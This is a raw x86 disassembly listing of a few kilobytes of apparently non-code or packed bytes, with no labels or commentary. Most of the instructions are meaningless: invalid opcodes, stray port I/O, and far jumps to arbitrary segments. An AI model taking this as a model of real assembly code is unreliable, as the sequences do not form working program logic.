  4110c6:	sub    ch,BYTE PTR [esi+esi*4+0x2be64f33]
  4110cd:	xchg   ebx,eax
  4110ce:	jge    0x4110aa
  4110d0:	lds    ebp,FWORD PTR [esi]
  4110d2:	pop    esp
  4110d3:	repz jmp 0xd205:0xd77cbd52
  4110db:	lds    ecx,FWORD PTR [ebp-0x60]
  4110de:	pop    ebx
  4110df:	scas   eax,DWORD PTR es:[edi]
  4110e0:	enter  0xce69,0x40
  4110e4:	cmp    BYTE PTR [ebx],ch
  4110e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e7:	xchg   ebp,eax
  4110e8:	pushf  
  4110e9:	ret    
  4110ea:	fsubr  st(2),st
  4110ec:	dec    esp
  4110ed:	mov    BYTE PTR [ecx+eiz*4-0x7b],0x5c
  4110f2:	call   0xb0d5349f
  4110f7:	pop    ss
  4110f8:	jp     0x41115d
  4110fa:	push   cs
  4110fb:	ja     0x411151
  4110fd:	mov    ebp,0x680892ae
  411102:	inc    esi
  411103:	out    0x6c,eax
  411105:	retf   
  411106:	aad    0xc7
  411108:	pop    esp
  411109:	out    dx,al
  41110a:	and    cl,dl
  41110c:	retf   0x1541
  41110f:	inc    edi
  411110:	pop    ebp
  411111:	inc    ebp
  411112:	(bad)  
  411113:	outs   dx,BYTE PTR ds:[esi]
  411114:	dec    esp
  411115:	xor    eax,esi
  411117:	iret   
  411118:	add    eax,0x5bd8aa6b
  41111d:	inc    ebp
  41111e:	out    dx,eax
  41111f:	hlt    
  411120:	xchg   ebx,eax
  411121:	sbb    eax,0x313f3769
  411126:	push   ss
  411127:	test   DWORD PTR [esi+0x309053ea],eax
  41112d:	mov    esp,0x7010673d
  411132:	pushf  
  411133:	pop    ecx
  411134:	addr16 lahf 
  411136:	inc    esp
  411137:	and    al,0xc
  411139:	or     al,0x9
  41113b:	pop    ss
  41113c:	sub    edi,eax
  41113e:	call   0xfc12:0x41e41573
  411145:	sbb    bl,BYTE PTR [edx+edi*8+0x53d0c42c]
  41114c:	(bad)  
  41114d:	das    
  41114e:	adc    BYTE PTR [edx],dh
  411150:	jmp    0xc8d3:0x4cd65287
  411157:	push   0x8e89827a
  41115c:	sar    DWORD PTR [edi+0x4d029480],cl
  411162:	retf   0xb3c1
  411165:	mov    edx,0xdd7a59ae
  41116a:	push   ss
  41116b:	pusha  
  41116c:	add    DWORD PTR [edi],edi
  41116e:	retf   0x15e0
  411171:	data16 adc BYTE PTR [esi-0x5f],bh
  411175:	loop   0x411177
  411177:	call   0x2be681e
  41117c:	inc    eax
  41117d:	ds daa 
  41117f:	retf   0xbd65
  411182:	iret   
  411183:	loopne 0x41114c
  411185:	lds    edi,FWORD PTR [edi-0x12]
  411188:	xchg   edi,eax
  411189:	imul   BYTE PTR [esi+0xf]
  41118c:	imul   ebx,DWORD PTR [eax-0x65e4e95d],0x815bab12
  411196:	in     eax,dx
  411197:	sbb    al,0xe0
  411199:	out    dx,al
  41119a:	jge    0x4111e6
  41119c:	aad    0x45
  41119e:	sbb    esi,DWORD PTR [eax]
  4111a0:	add    eax,0x6d42c239
  4111a5:	sbb    DWORD PTR [esi-0x363d8df7],ebp
  4111ab:	fnstcw WORD PTR [ebp-0x66f8d66d]
  4111b1:	je     0x41118e
  4111b3:	push   ss
  4111b4:	cmp    BYTE PTR [edx-0x37],al
  4111b7:	mov    al,0xe8
  4111b9:	mov    bl,0x62
  4111bb:	inc    edx
  4111bc:	loop   0x41120d
  4111be:	jbe    0x411183
  4111c0:	loop   0x41119c
  4111c2:	cmc    
  4111c3:	into   
  4111c4:	ins    BYTE PTR es:[di],dx
  4111c6:	cld    
  4111c7:	mov    esi,0xe01f1a18
  4111cc:	or     al,0xa0
  4111ce:	pop    eax
  4111cf:	mov    eax,ds:0x7fd14926
  4111d4:	pop    ebx
  4111d5:	loopne 0x411202
  4111d7:	mov    edx,0x8abcc242
  4111dc:	fnstcw WORD PTR ds:0x9abbba5
  4111e2:	pop    es
  4111e3:	cwde   
  4111e4:	test   DWORD PTR [ebx+0x447ff118],ebx
  4111ea:	add    eax,0x664def14
  4111ef:	xchg   ebx,eax
  4111f0:	sbb    DWORD PTR [edx],ebx
  4111f2:	dec    ecx
  4111f3:	adc    ah,cl
  4111f5:	add    ecx,DWORD PTR [edi+eax*4-0x18]
  4111f9:	pop    es
  4111fa:	sahf   
  4111fb:	(bad)  
  4111fc:	shl    BYTE PTR [esi*8+0x7645ece2],1
  411203:	jbe    0x41125d
  411205:	or     BYTE PTR [ebp-0x68d015fb],dl
  41120b:	add    DWORD PTR [ebx],eax
  41120d:	jmp    0x16e0:0xb9fb9d65
  411214:	mov    dh,BYTE PTR [edi+eiz*2]
  411217:	pop    esi
  411218:	or     al,ch
  41121a:	mov    ah,0xae
  41121c:	test   eax,0x23e068f2
  411221:	pop    esp
  411222:	data16 icebp 
  411224:	test   esp,ebx
  411226:	sub    al,0x81
  411228:	fcos   
  41122a:	sub    ah,bl
  41122c:	and    al,0x85
  41122e:	lods   al,BYTE PTR ds:[esi]
  41122f:	adc    dl,ah
  411231:	push   ss
  411232:	mov    BYTE PTR [edx],0x31
  411235:	(bad)
  411238:	rcl    BYTE PTR [esi],0x9e
  41123b:	and    al,0x8d
  41123d:	xchg   ebp,eax
  41123e:	adc    al,0x5a
  411240:	or     ebp,DWORD PTR [ebp-0x2f77c371]
  411246:	mov    eax,ds:0x72d1738f
  41124b:	push   esp
  41124c:	mov    DWORD PTR ds:0x3cfb9817,esp
  411252:	push   edx
  411253:	test   eax,0x9920a9c2
  411258:	jne    0x4112a4
  41125a:	out    0x62,al
  41125c:	lahf   
  41125d:	imul   edx,DWORD PTR [ecx*8-0x443a4a8c],0x511cb9aa
  411268:	adc    al,0x45
  41126a:	test   eax,0xb00122c8
  41126f:	pop    edi
  411270:	inc    eax
  411271:	nop
  411272:	pop    esi
  411273:	imul   ebx,DWORD PTR [esi],0x4e93bb8
  411279:	pop    eax
  41127a:	sbb    cl,BYTE PTR ds:0x38869dad
  411280:	dec    eax
  411281:	push   es
  411282:	pushf  
  411283:	fist   WORD PTR [eax+0xe]
  411286:	push   ss
  411287:	cwde   
  411288:	xor    BYTE PTR [edi],0xaf
  41128b:	in     eax,dx
  41128c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41128d:	mov    ds:0xe48e2651,al
  411292:	mov    BYTE PTR [ecx],0x5c
  411295:	rcl    DWORD PTR [ecx-0x6c137ada],cl
  41129b:	dec    eax
  41129c:	add    BYTE PTR [esi+0x4a4f3305],al
  4112a2:	mov    edi,0xea271807
  4112a7:	out    dx,eax
  4112a8:	lock nop
  4112aa:	xlat   BYTE PTR ds:[ebx]
  4112ab:	push   esi
  4112ac:	pop    edi
  4112ad:	cdq    
  4112ae:	jno    0x41125c
  4112b0:	inc    ebx
  4112b1:	bound  ebp,QWORD PTR [edx+0xb5f376f]
  4112b7:	jns    0x41130b
  4112b9:	mov    es,WORD PTR [esi+0x713722b6]
  4112bf:	in     eax,dx
  4112c0:	sahf   
  4112c1:	int    0x11
  4112c3:	aaa    
  4112c4:	shr    edi,1
  4112c6:	add    edx,DWORD PTR ds:0x81545da
  4112cc:	leave  
  4112cd:	sti    
  4112ce:	lods   eax,DWORD PTR ds:[esi]
  4112cf:	stos   DWORD PTR es:[edi],eax
  4112d0:	gs mov edi,esp
  4112d3:	ret    
  4112d4:	lods   eax,DWORD PTR ds:[esi]
  4112d5:	jecxz  0x4112db
  4112d7:	add    dl,BYTE PTR [ebx-0x1503a2e5]
  4112dd:	adc    ebp,ebp
  4112df:	mov    esi,0x834533af
  4112e4:	mov    dh,0x2b
  4112e6:	and    al,0xf6
  4112e8:	mov    ah,0xb1
  4112ea:	lods   eax,DWORD PTR ds:[esi]
  4112eb:	fisttp QWORD PTR [ebx+0x41]
  4112ee:	adc    edx,DWORD PTR [ecx+0x7c]
  4112f1:	(bad)  [ebp-0x2bc3532c]
  4112f7:	adc    esi,DWORD PTR [ebx+0x56]
  4112fa:	pop    ds
  4112fb:	mov    esi,0xf94517d7
  411300:	nop
  411301:	test   eax,0x5636518d
  411306:	sub    DWORD PTR [ecx-0x1a1a5cef],0xffffff9e
  41130d:	or     eax,0xc7a47635
  411312:	and    ebx,ebx
  411314:	arpl   WORD PTR [esi],cx
  411316:	les    esi,FWORD PTR [edi-0x5ea82e72]
  41131c:	mov    dl,0x32
  41131e:	push   edi
  41131f:	pop    eax
  411320:	lds    eax,FWORD PTR [eax-0x24]
  411323:	aad    0x7d
  411325:	and    eax,0x6a
  411328:	(bad)  
  411329:	shl    DWORD PTR [edi],cl
  41132b:	(bad)  
  41132c:	fild   QWORD PTR [edx-0x80]
  41132f:	in     eax,0x38
  411331:	jb     0x4112c3
  411333:	xor    DWORD PTR [ebx-0x24],0x1f
  411337:	imul   esp,DWORD PTR [edx+esi*2-0x1f],0x48
  41133c:	mov    dh,0x30
  41133e:	and    al,0xe8
  411340:	fwait
  411341:	loop   0x4113a8
  411343:	add    eax,DWORD PTR [eax]
  411345:	gs push esp
  411347:	adc    BYTE PTR [edx-0x20],0xee
  41134b:	mov    ?,WORD PTR [ebp-0x40]
  41134e:	mov    al,ds:0x7fb36b43
  411353:	pop    edi
  411354:	sub    al,0x74
  411356:	push   0xff0c2f05
  41135b:	mov    bl,0x6a
  41135d:	push   es
  41135e:	jle    0x411352
  411360:	shr    BYTE PTR [ecx+0x5f71204f],0x31
  411367:	sahf   
  411368:	lods   eax,DWORD PTR ds:[esi]
  411369:	sub    esp,edx
  41136b:	sbb    DWORD PTR [ebx-0x62551727],edi
  411371:	enter  0x1153,0x71
  411375:	sbb    BYTE PTR [ebp-0x48],al
  411378:	aaa    
  411379:	sbb    ch,BYTE PTR [edx+eax*1+0x5d]
  41137d:	xor    ah,BYTE PTR [ebx]
  41137f:	push   eax
  411380:	lods   al,BYTE PTR ds:[esi]
  411381:	inc    esp
  411382:	pop    esp
  411383:	(bad)  
  411386:	xor    BYTE PTR [eax],ch
  411388:	or     DWORD PTR [esi+0x9],edx
  41138b:	sub    esi,DWORD PTR [edi]
  41138d:	shl    ebx,0x61
  411390:	dec    esp
  411391:	rcl    DWORD PTR [ebp-0x1379e25e],0x7d
  411398:	lds    eax,FWORD PTR [edi+0xc8b1263]
  41139e:	js     0x411377
  4113a0:	ja     0x411419
  4113a2:	cwde   
  4113a3:	into   
  4113a4:	inc    esp
  4113a5:	sbb    eax,0x1ce85f32
  4113aa:	inc    eax
  4113ab:	dec    ebx
  4113ac:	retf   0x7e85
  4113af:	or     DWORD PTR [edx+0x66],ecx
  4113b2:	das    
  4113b3:	imul   edx,DWORD PTR [esi-0x36],0x7e
  4113b7:	xchg   ecx,eax
  4113b8:	pop    edi
  4113b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113ba:	mov    bl,0xf1
  4113bc:	out    0x7b,eax
  4113be:	cmp    dh,dl
  4113c0:	xor    al,0x5e
  4113c2:	pop    eax
  4113c3:	mov    edx,0x57b570b8
  4113c8:	jno    0x41138a
  4113ca:	pop    ebp
  4113cb:	inc    ebp
  4113cc:	dec    ecx
  4113cd:	ror    edi,1
  4113cf:	repnz dec ecx
  4113d1:	cmp    eax,ebp
  4113d3:	and    bl,bl
  4113d5:	jae    0x411382
  4113d7:	or     al,0xef
  4113d9:	leave  
  4113da:	cmp    eax,0xeef3fdef
  4113df:	sbb    ebp,ebp
  4113e1:	dec    esp
  4113e2:	and    ah,BYTE PTR [ebp-0x20b9044]
  4113e8:	scas   eax,DWORD PTR es:[edi]
  4113e9:	xchg   esi,eax
  4113ea:	sbb    esi,ebp
  4113ec:	icebp  
  4113ed:	mov    ecx,0xb22ee0a1
  4113f2:	mov    ebx,DWORD PTR [esp+ebp*8-0xb]
  4113f6:	iret   
  4113f7:	dec    esi
  4113f8:	or     BYTE PTR [esi],bh
  4113fa:	dec    edi
  4113fb:	mov    dl,0x75
  4113fd:	xchg   esi,eax
  4113fe:	inc    ecx
  4113ff:	idiv   BYTE PTR [ecx-0x27]
  411402:	jmp    0xcc2b:0x1530b183
  411409:	icebp  
  41140a:	xor    DWORD PTR [edi+0x2a3092ec],ebp
  411410:	loope  0x41147b
  411412:	mov    eax,0x979a6b32
  411417:	push   es
  411418:	psrad  mm4,QWORD PTR [ebp+edi*4+0x1736bf38]
  411420:	pop    esi
  411421:	sub    DWORD PTR cs:[edx],ecx
  411424:	clc    
  411425:	lods   eax,DWORD PTR ds:[esi]
  411426:	imul   ebx,DWORD PTR [ebx-0x66342cd1],0x33
  41142d:	mov    ah,0x81
  41142f:	sbb    edx,eax
  411431:	dec    ebp
  411432:	mov    ebp,0xa8e24bb7
  411437:	aad    0x5e
  411439:	sar    ecx,1
  41143b:	divps  xmm1,XMMWORD PTR [ebx+0x20]
  41143f:	mov    ah,bh
  411441:	mov    dh,0xe5
  411443:	inc    ebx
  411444:	push   ecx
  411445:	xchg   ecx,eax
  411446:	lock jle 0x411460
  411449:	pop    esi
  41144a:	sub    eax,0xc8f9e607
  41144f:	out    0xbe,eax
  411451:	and    ebx,DWORD PTR [ebp+0x5f]
  411454:	push   0x78
  411456:	push   ds
  411457:	or     al,0xa5
  411459:	pusha  
  41145a:	test   al,0x2f
  41145c:	lods   al,BYTE PTR ds:[esi]
  41145d:	push   0xffffffe4
  41145f:	shl    BYTE PTR [esi],1
  411461:	pavgw  mm2,QWORD PTR [edx+0x51]
  411465:	inc    ecx
  411466:	rcl    ah,0x79
  411469:	mov    ch,0xcd
  41146b:	daa    
  41146c:	jmp    0xdc601838
  411471:	push   ss
  411472:	rol    bl,0x1a
  411475:	or     DWORD PTR [ecx+0x56],eax
  411478:	enter  0xbe31,0xc0
  41147c:	inc    edx
  41147d:	sub    al,0xf3
  41147f:	xor    BYTE PTR [ecx],bh
  411481:	fisub  WORD PTR [edx+eax*4-0x107e56f3]
  411488:	add    al,0xd1
  41148a:	ss pop ss
  41148c:	xchg   edi,eax
  41148d:	adc    DWORD PTR [edi],edx
  41148f:	jnp    0x411484
  411491:	and    eax,0xa5da74f6
  411496:	adc    eax,0xa18f5b33
  41149b:	add    DWORD PTR [ecx+ebp*4+0x61],esp
  41149f:	out    dx,eax
  4114a0:	sbb    eax,0xce4d48e8
  4114a5:	test   al,0x64
  4114a7:	(bad)  
  4114a8:	dec    ebp
  4114a9:	lds    esp,FWORD PTR ds:0xd25b7e67
  4114af:	pop    eax
  4114b0:	push   eax
  4114b1:	retf   0x7277
  4114b4:	sub    DWORD PTR ss:[ebx-0xd6fc402],ebp
  4114bb:	repz dec edx
  4114bd:	int3   
  4114be:	ror    BYTE PTR [ebx-0x1e0e7334],cl
  4114c4:	icebp  
  4114c5:	inc    esp
  4114c6:	adc    ebx,0xffffffd0
  4114c9:	mov    esi,DWORD PTR [ecx+0x65623038]
  4114cf:	shr    DWORD PTR [esi],1
  4114d1:	adc    ch,0xc4
  4114d4:	lods   eax,DWORD PTR ds:[esi]
  4114d5:	mov    BYTE PTR [ebx],ch
  4114d7:	repnz and cl,BYTE PTR [edx+0x6e]
  4114db:	nop
  4114dc:	test   eax,0xaa03c2f4
  4114e1:	xchg   ebp,eax
  4114e2:	sti    
  4114e3:	sti    
  4114e4:	call   0xc678:0x8bd2bfb8
  4114eb:	xchg   esi,eax
  4114ec:	loopne 0x41149e
  4114ee:	inc    edi
  4114ef:	add    eax,esi
  4114f1:	jp     0x4114b8
  4114f3:	mov    bl,0x91
  4114f5:	dec    esp
  4114f6:	popa   
  4114f7:	push   ds
  4114f8:	mov    fs,WORD PTR [ecx+0xf]
  4114fb:	loop   0x4114e9
  4114fd:	std    
  4114fe:	daa    
  4114ff:	push   0x12
  411501:	int3   
  411502:	inc    esp
  411503:	fisttp WORD PTR [edx+0x33a6f721]
  411509:	les    edi,FWORD PTR [ebx]
  41150b:	leave  
  41150c:	stos   BYTE PTR es:[edi],al
  41150d:	mov    edx,0x54e71b49
  411512:	in     al,dx
  411513:	or     bh,0x72
  411516:	pusha  
  411517:	icebp  
  411518:	aam    0x28
  41151a:	es jmp 0x357198ad
  411520:	and    BYTE PTR ds:0xd50c18,al
  411526:	cmp    DWORD PTR [edi],0x765a1af4
  41152c:	push   edi
  41152d:	pop    edi
  41152e:	enter  0x7c32,0x19
  411532:	xor    cl,BYTE PTR [ecx+ebp*1-0x27f5cec1]
  411539:	cs nop
  41153b:	xchg   bp,ax
  41153d:	es lock jl 0x4114eb
  411541:	outs   dx,DWORD PTR ds:[esi]
  411542:	xchg   BYTE PTR [ecx+0x349aa1f6],cl
  411548:	pop    ebx
  411549:	or     ebp,edi
  41154b:	cmp    BYTE PTR [ebx],bl
  41154d:	inc    ebx
  41154e:	mov    bh,0x3c
  411550:	or     ah,al
  411552:	out    dx,al
  411553:	cld    
  411554:	and    BYTE PTR [ebp-0x52f9923e],0xd0
  41155b:	jae    0x411584
  41155d:	inc    ebx
  41155e:	inc    eax
  41155f:	jecxz  0x41150b
  411561:	stos   DWORD PTR es:[edi],eax
  411562:	pop    es
  411563:	push   eax
  411564:	outs   dx,BYTE PTR ds:[esi]
  411565:	jns    0x411519
  411567:	cmp    al,0x21
  411569:	scas   eax,DWORD PTR es:[edi]
  41156a:	ret    
  41156b:	aam    0x71
  41156d:	outs   dx,DWORD PTR cs:[esi]
  41156f:	sbb    DWORD PTR [edx+0x1],0xffffffaf
  411573:	fnstenv [ebp-0x3c]
  411576:	adc    BYTE PTR [ebx+0x735c736b],ch
  41157c:	clc    
  41157d:	xchg   esi,eax
  41157e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41157f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411580:	fst    st(0)
  411582:	mov    DWORD PTR [ebx-0x3a909e02],ebp
  411588:	daa    
  411589:	(bad)  
  41158a:	pop    ebp
  41158b:	arpl   WORD PTR [eax-0x32c4cc56],di
  411591:	shl    DWORD PTR [edx+0x57],cl
  411594:	add    DWORD PTR fs:[esp+edx*2+0x7fbe232],ecx
  41159c:	and    DWORD PTR [edx-0x1f],ebp
  41159f:	push   ebx
  4115a0:	or     ch,bl
  4115a2:	mov    esi,0xe29aede8
  4115a7:	das    
  4115a8:	pop    ebx
  4115a9:	adc    BYTE PTR [ebx-0x145ac2b7],bl
  4115af:	adc    DWORD PTR [edx+0x4f],ebx
  4115b2:	ja     0x411595
  4115b4:	or     bl,BYTE PTR [eax-0x27a80fcf]
  4115ba:	jbe    0x411593
  4115bc:	ror    ch,cl
  4115be:	inc    ecx
  4115bf:	sahf   
  4115c0:	xchg   ebp,eax
  4115c1:	pop    ss
  4115c2:	add    ebp,DWORD PTR [edi+0x5c09fb35]
  4115c8:	mov    esp,0x37323da9
  4115cd:	dec    esp
  4115ce:	iret   
  4115cf:	fcmovb st,st(4)
  4115d1:	stos   DWORD PTR es:[edi],eax
  4115d2:	pop    eax
  4115d3:	and    DWORD PTR [edi],0x56
  4115d6:	and    dh,bl
  4115d8:	push   ebp
  4115d9:	pop    ds
  4115da:	into   
  4115db:	repnz and al,0xa9
  4115de:	out    0x4e,eax
  4115e0:	loopne 0x411641
  4115e2:	ret    0x11c0
  4115e5:	or     BYTE PTR [eax+ebx*1],bh
  4115e8:	dec    ecx
  4115e9:	xor    BYTE PTR [edi-0x38f75e45],dh
  4115ef:	das    
  4115f0:	jno    0x4115c1
  4115f2:	mov    cl,bl
  4115f4:	mov    BYTE PTR [edi],al
  4115f6:	fcom   st(5)
  4115f8:	adc    esp,DWORD PTR [edx+0x1dff061e]
  4115fe:	pushf  
  4115ff:	sbb    edx,ecx
  411601:	jnp    0x411615
  411603:	rol    DWORD PTR [ebx+eax*4+0x16101359],1
  41160a:	or     al,0x2f
  41160c:	in     al,dx
  41160d:	ins    DWORD PTR es:[edi],dx
  41160e:	clc    
  41160f:	inc    ebp
  411610:	xchg   esi,eax
  411611:	xor    esi,eax
  411613:	aas    
  411614:	mov    WORD PTR [ebx-0x3b],fs
  411617:	cmc    
  411618:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411619:	mov    edi,0x58c22f46
  41161e:	ret    0x6172
  411621:	stc    
  411622:	mov    esp,0x6a2e90d0
  411627:	pusha  
  411628:	sbb    edx,DWORD PTR [edx]
  41162a:	push   esp
  41162b:	mov    cl,0x7e
  41162d:	mov    cl,BYTE PTR [ecx+0xc4cd99c]
  411633:	sti    
  411634:	ins    DWORD PTR es:[edi],dx
  411635:	fwait
  411636:	add    eax,0xcb888abe
  41163b:	test   esp,ebx
  41163d:	mov    ebp,DWORD PTR [ecx]
  41163f:	pop    esi
  411640:	retf   
  411641:	xchg   esp,eax
  411642:	and    DWORD PTR [edx],esp
  411644:	dec    ebp
  411645:	dec    edx
  411646:	rcl    eax,1
  411648:	push   edx
  411649:	popf   
  41164a:	mov    ch,0x99
  41164c:	xchg   ecx,eax
  41164d:	aam    0xa8
  41164f:	dec    esi
  411650:	or     BYTE PTR [ecx+0x44],dl
  411653:	popa   
  411654:	mov    bh,0x87
  411656:	shr    ecx,1
  411658:	sbb    eax,0xd87bde87
  41165d:	ret    0xab5a
  411660:	or     ebp,DWORD PTR [esi+0x31]
  411663:	sbb    eax,0xbbb36e3c
  411668:	xor    DWORD PTR [ebx+eax*1+0x685b863d],esi
  41166f:	sub    BYTE PTR [ecx],ah
  411671:	aam    0xa1
  411673:	jmp    0x5af88192
  411678:	cmc    
  411679:	push   edx
  41167a:	mul    BYTE PTR [ebx+0x5d]
  41167d:	dec    esp
  41167e:	leave  
  41167f:	ror    DWORD PTR [edi],0x2e
  411682:	data16 lods al,BYTE PTR ds:[esi]
  411684:	clc    
  411685:	pushf  
  411686:	out    dx,eax
  411687:	nop    DWORD PTR [edi]
  41168a:	out    dx,al
  41168b:	mov    dl,cl
  41168d:	lock sub BYTE PTR [eax],al
  411690:	jae    0x41167d
  411692:	mov    cl,0x2a
  411694:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411695:	test   BYTE PTR [esi],al
  411697:	and    edi,edx
  411699:	fadd   QWORD PTR [ecx-0xa]
  41169c:	jmp    0x411657
  41169e:	inc    ecx
  41169f:	jge    0x411651
  4116a1:	out    0x58,al
  4116a3:	jnp    0x4116ef
  4116a5:	lea    ebx,[esi+ecx*8-0x5f6e154a]
  4116ac:	sub    al,bh
  4116ae:	stos   DWORD PTR es:[edi],eax
  4116af:	lds    ecx,FWORD PTR [edi+0x2]
  4116b2:	push   edx
  4116b3:	sbb    cl,BYTE PTR [eax-0x28]
  4116b6:	sbb    bh,BYTE PTR [edx+edi*4]
  4116b9:	idiv   BYTE PTR [edx+0x1f63de6f]
  4116bf:	int3   
  4116c0:	jge    0x4116c8
  4116c2:	(bad)  
  4116c3:	push   0xffffff94
  4116c5:	or     edi,edx
  4116c7:	mov    al,ds:0xf0cbdf61
  4116cc:	mov    es,WORD PTR [ecx+0x37dde777]
  4116d2:	out    0x65,eax
  4116d4:	gs push ds
  4116d6:	xor    al,0x1c
  4116d8:	loope  0x411735
  4116da:	clc    
  4116db:	mov    es,WORD PTR [esi-0x65eded97]
  4116e1:	inc    eax
  4116e2:	adc    dl,dl
  4116e4:	adc    esp,DWORD PTR [ecx+0x7884ed03]
  4116ea:	xchg   BYTE PTR [edx-0x8c8be99],ah
  4116f0:	loope  0x41170a
  4116f2:	aaa    
  4116f3:	repnz retf 0x4af3
  4116f7:	ins    DWORD PTR es:[edi],dx
  4116f8:	in     eax,dx
  4116f9:	fwait
  4116fa:	stos   BYTE PTR es:[edi],al
  4116fb:	ja     0x41169c
  4116fd:	ins    DWORD PTR es:[edi],dx
  4116fe:	mul    BYTE PTR [eax+0x6ba6ac6c]
  411704:	cmp    al,0x0
  411706:	and    ch,ah
  411708:	mov    esi,0xedd0339c
  41170d:	out    dx,eax
  41170e:	push   es
  41170f:	sahf   
  411710:	(bad)  
  411712:	in     eax,dx
  411713:	mov    BYTE PTR [esp+edi*8+0x5c8d2c26],cl
  41171a:	in     al,dx
  41171b:	rcl    DWORD PTR [eax+0x415c055d],0xca
  411722:	mov    cl,0x56
  411724:	jge    0x411747
  411726:	(bad)  
  411727:	js     0x4116b9
  411729:	xlat   BYTE PTR ds:[ebx]
  41172a:	inc    edi
  41172b:	pop    esi
  41172c:	and    eax,0x7aaeeef
  411731:	dec    edi
  411732:	xor    al,0x9c
  411734:	ja     0x411757
  411736:	out    dx,eax
  411737:	push   0x4edf89a3
  41173c:	push   ss
  41173d:	test   DWORD PTR [eax],0x6a76c763
  411743:	mov    bh,0x62
  411745:	and    ecx,DWORD PTR [ebx-0x47]
  411748:	or     eax,0xd70a6a3
  41174d:	ror    BYTE PTR [edi+0x27],0x86
  411751:	inc    esp
  411752:	add    BYTE PTR [eax+0x3b6b509d],dh
  411758:	je     0x41177d
  41175a:	or     DWORD PTR [edx],esi
  41175c:	loopne 0x4117c6
  41175e:	xor    esp,DWORD PTR [ebp-0x350cb54d]
  411764:	cli    
  411765:	dec    ebp
  411766:	lea    ebp,[edx-0x61d91608]
  41176c:	enter  0x9ca4,0x92
  411770:	scas   al,BYTE PTR es:[edi]
  411771:	cmp    edi,edx
  411773:	repnz test al,0x46
  411776:	cmp    ebx,edx
  411778:	inc    esi
  411779:	into   
  41177a:	dec    eax
  41177b:	jne    0x4117b6
  41177d:	ss popa 
  41177f:	(bad)  
  411780:	daa    
  411781:	stos   DWORD PTR es:[edi],eax
  411782:	cmp    eax,0xc1494cc7
  411787:	lock mov fs,WORD PTR [ecx-0x192d099d]
  41178e:	repz cs (bad) 
  411791:	bound  ebx,QWORD PTR [esi+0x3a1692b8]
  411797:	(bad)  
  411798:	cli    
  411799:	repz cli 
  41179b:	mov    dh,0x3e
  41179d:	aaa    
  41179e:	inc    ebp
  41179f:	out    0xc2,al
  4117a1:	xchg   ebx,eax
  4117a2:	test   al,0x33
  4117a4:	mov    edi,esp
  4117a6:	mov    edi,0xe4915e4e
  4117ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117ac:	jnp    0x4117ea
  4117ae:	fisubr DWORD PTR [eax+0x57991498]
  4117b4:	jns    0x41175f
  4117b6:	mov    eax,0x55bd01cc
  4117bb:	(bad)  
  4117bc:	fimul  WORD PTR [ebp-0x14]
  4117bf:	xor    BYTE PTR [ebx],dl
  4117c1:	push   cs
  4117c2:	push   ebx
  4117c3:	dec    esi
  4117c4:	cmc    
  4117c5:	mov    ch,0x4
  4117c7:	pop    esi
  4117c8:	adc    eax,0xe625d605
  4117cd:	dec    edi
  4117ce:	sub    ah,BYTE PTR [eax+0x13]
  4117d1:	cwde   
  4117d2:	clc    
  4117d3:	imul   esp,DWORD PTR [ecx-0x5a931757],0x45322ec5
  4117dd:	adc    DWORD PTR [ebp+0x3715af70],edx
  4117e3:	pop    ecx
  4117e4:	aas    
  4117e5:	sub    ebx,DWORD PTR [esi]
  4117e7:	adc    al,0xb8
  4117e9:	fwait
  4117ea:	ins    BYTE PTR es:[edi],dx
  4117eb:	mov    al,0x55
  4117ed:	ds push esi
  4117ef:	icebp  
  4117f0:	and    esi,edi
  4117f2:	add    al,0x89
  4117f4:	mov    bl,0x3d
  4117f6:	aaa    
  4117f7:	outs   dx,BYTE PTR ds:[esi]
  4117f8:	mov    dl,0xc6
  4117fa:	loope  0x411839
  4117fc:	add    bh,dh
  4117fe:	test   al,0xc0
  411800:	xor    eax,0xc27338ae
  411805:	sbb    BYTE PTR [edx],ch
  411807:	mov    bh,0xf6
  411809:	fwait
  41180a:	out    0x32,al
  41180c:	dec    edi
  41180d:	inc    esi
  41180e:	test   eax,0x6ba48bb2
  411813:	fwait
  411814:	arpl   WORD PTR [ebp-0x30],bx
  411817:	inc    ebx
  411818:	inc    edi
  411819:	dec    ebx
  41181a:	inc    eax
  41181b:	add    DWORD PTR [edi-0x4c],eax
  41181e:	in     al,0x7b
  411820:	ins    BYTE PTR es:[edi],dx
  411821:	lods   eax,DWORD PTR ds:[esi]
  411822:	aas    
  411823:	and    ecx,DWORD PTR [edx-0x2e80ec0]
  411829:	addr16 jb 0x4117e1
  41182c:	test   al,cl
  41182e:	(bad)  [ebx-0x64]
  411831:	mov    dl,0xc0
  411833:	mov    esi,edi
  411835:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411836:	mov    al,ds:0x97d8a298
  41183b:	and    bh,BYTE PTR [ebx+0x66]
  41183e:	int3   
  41183f:	icebp  
  411840:	aas    
  411841:	shl    DWORD PTR [ecx+ebp*8-0x8],1
  411845:	sbb    al,0x4b
  411847:	xor    ebx,ebx
  411849:	add    esi,ecx
  41184b:	adc    ebx,0xffffffff
  41184e:	xor    edi,edi
  411850:	xor    esi,eax
  411852:	xor    ebx,0x0
  411855:	jmp    0x413be9
  41185a:	pop    ss
  41185b:	push   edx
  41185c:	mov    al,0x83
  41185f:	aam    0xe3
  411861:	imul   ebx,DWORD PTR [eax+0x68],0xb02fba54
  411868:	fwait
  411869:	jbe    0x41185f
  41186b:	push   0x62
  41186d:	(bad)  
  41186e:	jmp    0x4118cf
  411870:	bound  esp,QWORD PTR [edx+0x27]
  411873:	test   BYTE PTR [esi+0x1f28d32e],al
  411879:	lds    eax,FWORD PTR [edi]
  41187b:	jo     0x41181c
  41187d:	mov    eax,ds:0x1747d324
  411882:	or     BYTE PTR [ebp+0x15],bl
  411885:	pop    ds
  411886:	pop    ebp
  411887:	out    dx,al
  411888:	std    
  411889:	int    0x52
  41188b:	dec    ecx
  41188c:	mov    ebp,0x22482dcb
  411891:	data16 sar BYTE PTR [ebx],0x5c
  411895:	mov    WORD PTR [edi+0x2f],fs
  411898:	loope  0x4118e7
  41189a:	cmp    esi,DWORD PTR [ebx+ebp*2]
  41189d:	in     eax,0x6f
  41189f:	xchg   ebp,eax
